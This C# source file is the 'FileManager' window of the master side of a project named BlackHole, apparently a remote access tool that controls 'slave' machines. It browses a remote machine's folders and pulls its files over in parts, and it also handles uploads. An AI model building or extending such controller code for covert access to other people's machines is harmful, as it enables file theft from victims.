using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager : ISlaveWindow
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModel<FileMeta> ViewModelFiles
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModel<FileTransaction> ViewModelDownloads
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        public Slave Slave
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private int m_nextDownloadId;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : this()
        {
            Slave = slave;

            TargetStatusBar.DataContext = slave;

            DownloadsList.DataContext = ViewModelDownloads = new ViewModel<FileTransaction>();
            FilesList.DataContext = ViewModelFiles = new ViewModel<FileMeta>();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder)
        {
            this.Send(new NavigateToFolderMessage()
            {
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            this.Send(new DownloadFilePartMessage()
            {
                Id = m_nextDownloadId++,
                CurrentPart = 0,
                Path = Path.Combine(TxtBoxDirectory.Text, name)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.DISCONNECTED:
                        MessageBox.Show("Slave disconnected", "Information", MessageBoxButton.OK, MessageBoxImage.Information);
                        Close();
                        break;

                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.Items.Add);
                            })
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                TargetStatusTooltip.PlacementTarget = TargetStatus;
                                TargetStatusTooltip.IsOpen = true;
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                UpdateFileTransaction<FileDownload>(m,
                                    (download) =>
                                    {
                                        var raw = download.RawFile.ToArray();
                                        Slave.SaveDownloadedFile(download.Name, raw);
                                        Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, raw));
                                    },
                                    (download) => this.Send(new DownloadFilePartMessage()
                                    {
                                        Id = download.Id,
                                        Path = download.FilePath,
                                        CurrentPart = m.CurrentPart + 1
                                    }));
                            })
                            .With<DownloadFilePartMessage>(m =>
                            {
                                Utility.ExecuteComplexOperation("File upload", 
                                    () => CommonHelper.DownloadFilePart(m.Id, m.CurrentPart, m.Path),
                                    (part) => 
                                    {
                                        UpdateFileTransaction<FileUpload>(part,
                                            (upload) =>
                                            {
                                                Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, upload.FilePath));
                                            },
                                            (upload) => this.Send(part));                                        
                                    },
                                    (e) =>
                                    {
                                        Slave.SlaveEvents.PostEvent(
                                            new SlaveEvent(
                                                SlaveEventType.INCOMMING_MESSAGE,
                                                Slave,
                                                new StatusUpdateMessage()
                                                {
                                                    Operation = "File upload",
                                                    Success = false,
                                                    Message = e.Message
                                                }));
                                    });
                            });                        
                        break;
                }
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="part"></param>
        private void UpdateFileTransaction<T>(DownloadedFilePartMessage part, Action<T> onCompleted, Action<T> onContinue)
            where T : FileTransaction, new()
        {
            var model = FindOrCreateFileTransaction<T>(part);
            if (model.Completed)
            {
                onCompleted(model);
                Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
                {
                    ViewModelDownloads.Items.Remove(model);
                });
            }
            else
                onContinue(model);
        }
            
        /// <summary>
        /// 
        /// </summary>
        /// <param name="part"></param>
        /// <returns></returns>
        private T FindOrCreateFileTransaction<T>(DownloadedFilePartMessage part)
            where T : FileTransaction, new()
        {
            var model = FindFileTransaction<T>(part);
            if (model == null)
            {
                model = new T();
                model.Id = part.Id;
                model.FilePath = part.Path;
                ViewModelDownloads.Items.Add(model);
            }
            model.OnPartDownloaded(part);
            return model;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        private T FindFileTransaction<T>(DownloadedFilePartMessage part)
            where T : FileTransaction
            => ViewModelDownloads.Items.OfType<T>().FirstOrDefault(mod => mod.Id == part.Id);
    }
}
